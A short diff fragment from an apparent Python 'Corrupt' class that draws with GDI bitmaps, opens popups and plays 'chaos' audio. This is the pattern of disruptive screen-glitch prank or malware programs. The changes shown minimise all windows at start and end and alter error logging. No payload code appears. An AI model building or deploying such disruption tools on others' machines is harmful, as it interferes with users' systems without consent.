@@ -318,6 +318,7 @@ class Corrupt:
 
         # --- Runner ---
         def run(self):
+            keyboard.send('windows+m')
             hdc = memdc = hbmp = None
             sw = sh = 0
             started = time.time()
@@ -335,7 +336,7 @@ class Corrupt:
             except KeyboardInterrupt:
                 self.stop_event.set()
             except Exception as e:
-                print(f"[!] Runtime error: {e}", file=sys.stderr)
+                handler.exception(f"[!] Runtime error: {e}: {sys.stderr}")
             finally:
                 self.stop_event.set()
                 self.__close_our_popups()
@@ -345,6 +346,7 @@ class Corrupt:
                     except Exception:
                         pass
                 self.__release_gdi(hdc, memdc, hbmp)
+                keyboard.send('windows+m')
 
     @staticmethod
     def chaos_audio(duration=60, sample_rate=44100, volume=0.8):
